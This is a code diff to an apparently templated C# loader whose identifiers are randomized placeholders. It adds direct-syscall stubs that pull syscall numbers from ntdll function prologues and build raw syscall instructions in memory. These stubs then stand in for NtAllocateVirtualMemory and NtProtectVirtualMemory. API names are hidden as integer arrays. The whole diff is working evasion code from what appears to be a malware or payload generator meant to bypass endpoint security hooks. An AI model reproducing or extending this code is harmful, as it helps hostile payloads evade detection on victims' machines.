@@ -41,6 +41,30 @@
 
             static byte[] {{ v.mb_fn_n }}(int[] c) { var {{ v.mb_lv_n_b }}=new byte[c.Length+1]; for(int {{ v.mb_lv_n_i }}=0;{{ v.mb_lv_n_i }}<c.Length;{{ v.mb_lv_n_i }}++) {{ v.mb_lv_n_b }}[{{ v.mb_lv_n_i }}]=(byte)c[{{ v.mb_lv_n_i }}]; return {{ v.mb_lv_n_b }}; }
 
+            static IntPtr {{ v.fn_syscall }}(int ssn) {
+                IntPtr p = Marshal.AllocHGlobal(12);
+                Marshal.WriteByte(p,  0, 0x4C);
+                Marshal.WriteByte(p,  1, 0x8B);
+                Marshal.WriteByte(p,  2, 0xD1);
+                Marshal.WriteByte(p,  3, 0xB8);
+                Marshal.WriteByte(p,  4, (byte)(ssn & 0xFF));
+                Marshal.WriteByte(p,  5, (byte)((ssn >> 8) & 0xFF));
+                Marshal.WriteByte(p,  6, 0);
+                Marshal.WriteByte(p,  7, 0);
+                Marshal.WriteByte(p,  8, 0x0F);
+                Marshal.WriteByte(p,  9, 0x05);
+                Marshal.WriteByte(p, 10, 0xC3);
+                return p;
+            }
+
+            static int {{ v.fn_extract_ssn }}(IntPtr fnAddr) {
+                if (Marshal.ReadByte(fnAddr, 0) != 0x4C) return -1;
+                if (Marshal.ReadByte(fnAddr, 1) != 0x8B) return -1;
+                if (Marshal.ReadByte(fnAddr, 2) != 0xD1) return -1;
+                if (Marshal.ReadByte(fnAddr, 3) != 0xB8) return -1;
+                return Marshal.ReadByte(fnAddr, 4) | (Marshal.ReadByte(fnAddr, 5) << 8);
+            }
+
             static IntPtr {{ v.fn_getexport }}(IntPtr mod, byte[] name) {
                 try {
                     int {{ v.mb_lv_ge_peo }}    = Marshal.ReadInt32(mod, 0x3C);
@@ -182,7 +206,11 @@
                 byte[] {{ v.mb_lv_ex_allocn }} = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_alloc_vm }} });
                 byte[] {{ v.mb_lv_ex_protn }}  = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_prot_vm }} });
                 IntPtr {{ v.mb_lv_ex_allocaddr }} = {{ v.fn_getexport }}({{ v.mb_lv_ex_ntdll }}, {{ v.mb_lv_ex_allocn }});
+                int {{ v.mb_lv_ex_allocaddr }}_ssn = {{ v.fn_extract_ssn }}({{ v.mb_lv_ex_allocaddr }});
+                if ({{ v.mb_lv_ex_allocaddr }}_ssn >= 0) {{ v.mb_lv_ex_allocaddr }} = {{ v.fn_syscall }}({{ v.mb_lv_ex_allocaddr }}_ssn);
                 IntPtr {{ v.mb_lv_ex_protaddr }}  = {{ v.fn_getexport }}({{ v.mb_lv_ex_ntdll }}, {{ v.mb_lv_ex_protn }});
+                int {{ v.mb_lv_ex_protaddr }}_ssn = {{ v.fn_extract_ssn }}({{ v.mb_lv_ex_protaddr }});
+                if ({{ v.mb_lv_ex_protaddr }}_ssn >= 0) {{ v.mb_lv_ex_protaddr }} = {{ v.fn_syscall }}({{ v.mb_lv_ex_protaddr }}_ssn);
                 if ({{ v.mb_lv_ex_allocaddr }} == IntPtr.Zero || {{ v.mb_lv_ex_protaddr }} == IntPtr.Zero) return false;
 
                 var {{ v.fn_nt_alloc }} = ({{ v.del_nt_alloc }})Marshal.GetDelegateForFunctionPointer({{ v.mb_lv_ex_allocaddr }}, typeof({{ v.del_nt_alloc }}));
